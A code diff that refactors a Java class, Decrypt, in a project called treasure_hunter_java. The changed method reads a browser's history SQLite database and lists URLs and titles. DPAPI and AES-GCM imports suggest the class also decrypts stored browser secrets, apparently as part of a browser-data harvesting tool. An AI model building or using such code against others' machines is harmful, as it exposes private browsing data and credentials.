@@ -1,30 +1,21 @@
-package com.treasure_hunter_java;
+package com.treasure_hunter_java.decrypt;
 
 import java.io.*;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
-import java.security.spec.KeySpec;
 import java.sql.*;
 import java.util.Arrays;
 import java.util.Base64;
 
 import javax.crypto.Cipher;
-import javax.crypto.SecretKey;
-import javax.crypto.SecretKeyFactory;
 import javax.crypto.spec.GCMParameterSpec;
-import javax.crypto.spec.IvParameterSpec;
-import javax.crypto.spec.PBEKeySpec;
 import javax.crypto.spec.SecretKeySpec;
 
 import com.sun.jna.platform.win32.Crypt32Util;
-import org.apache.commons.codec.binary.Hex;
-//import org.bouncycastle.util.encoders.Hex;
+
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
-
-import org.sqlite.SQLiteConnection;
-
 
 public class Decrypt {
 
@@ -106,33 +97,31 @@ public class Decrypt {
         return text;
     }
 
-    public static String getHistory(String historyPath){
-        String text = "" + "\n";
+    public static String getHistory(String historyPath) {
+        StringBuilder textBuilder = new StringBuilder();
+        textBuilder.append("\n");
+
         File dbFile = new File(historyPath);
-        Connection conn = null;
-        try {
-            Class.forName("org.sqlite.JDBC");
-            conn = DriverManager.getConnection("jdbc:sqlite:" + dbFile.getAbsolutePath());
-            Statement stmt = conn.createStatement();
-            ResultSet rs = stmt.executeQuery("SELECT id, url, title FROM urls");
+
+        try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + dbFile.getAbsolutePath());
+             Statement stmt = conn.createStatement();
+             ResultSet rs = stmt.executeQuery("SELECT id, url, title FROM urls")) {
+
             while (rs.next()) {
                 int id = rs.getInt("id");
                 String url = rs.getString("url");
                 String title = rs.getString("title");
-                text += "ID: " + id + " | URL: " + url + " | Title: " + title + "\n";
+                textBuilder.append("ID: ").append(id)
+                        .append(" | URL: ").append(url)
+                        .append(" | Title: ").append(title)
+                        .append("\n");
             }
-        } catch (ClassNotFoundException | SQLException e) {
-            e.printStackTrace();
-        } finally {
-            try {
-                if (conn != null) {
-                    conn.close();
-                }
-            } catch (SQLException ex) {
-                ex.printStackTrace();
-            }
-        }
-        return text;
 
+        } catch (SQLException e) {
+            e.printStackTrace();
+        }
+
+        return textBuilder.toString();
     }
+
 }
